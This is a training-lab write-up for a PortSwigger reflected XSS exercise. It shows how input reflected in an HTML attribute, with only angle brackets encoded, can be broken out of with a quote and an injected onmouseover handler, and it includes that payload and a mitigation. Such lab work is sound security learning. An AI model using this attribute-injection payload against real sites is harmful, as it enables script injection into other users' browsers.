# Lab15 - Reflected XSS Into HTML Attribute With Angle Brackets HTML-Encoded

## Objective

Exploit a reflected XSS vulnerability where:

```text
< and >
```

are HTML-encoded, but attacker-controlled input is reflected inside an HTML attribute.

Execute:

```javascript
alert(1)
```

to solve the lab.

---

# Lab Information

| Field | Value |
|---------|---------|
| Category | Reflected XSS |
| Difficulty | Apprentice |
| Context | HTML Attribute |
| Platform | PortSwigger |

---

# Vulnerability Overview

The application reflects user input inside:

```html
<input value="USER_INPUT">
```

while encoding:

```html
<
>
```

This prevents tag injection but does not prevent:

```text
Attribute Injection
```

---

# Analysis

## Step 1

Search:

```text
carry123
```

---

## Step 2

Inspect response.

Observed:

```html
<input value="carry123">
```

---

## Step 3

Determine Context

Input appears inside:

```text
HTML Attribute
```

---

## Step 4

Need To Escape Attribute

Goal:

```text
Close Attribute
        ↓
Inject New Attribute
        ↓
Trigger Event
```

---

# Full Payload(s) Used

## Probe

```text
carry123
```

---

## Final Payload

```html
" onmouseover="alert(1)
```

---

# Why The Payload Works

Original:

```html
<input value="test">
```

---

Injected:

```html
<input value=""
onmouseover="alert(1)">
```

---

Execution Flow

```text
Attribute Closed
        ↓
onmouseover Added
        ↓
Mouse Hover
        ↓
alert(1)
```

---

# Personal Analysis & Testing Process

## Initial Observation

Tags blocked.

---

## Key Realization

Input reflected inside:

```html
value=""
```

attribute.

---

## Exploitation Strategy

Instead of injecting tags:

```text
Inject New Attribute
```

---

## Result

Hover triggered:

```javascript
alert(1)
```

Lab solved.

---

# Mitigation

HTML-encode:

```html
"
'
<
>
```

Use contextual output encoding.

---

# Related Theory

- 24-xss-in-html-tag-attributes.md

---

# Key Learnings

- Encoding angle brackets alone is insufficient.
- Attribute injection can still lead to XSS.
- Context determines payload choice.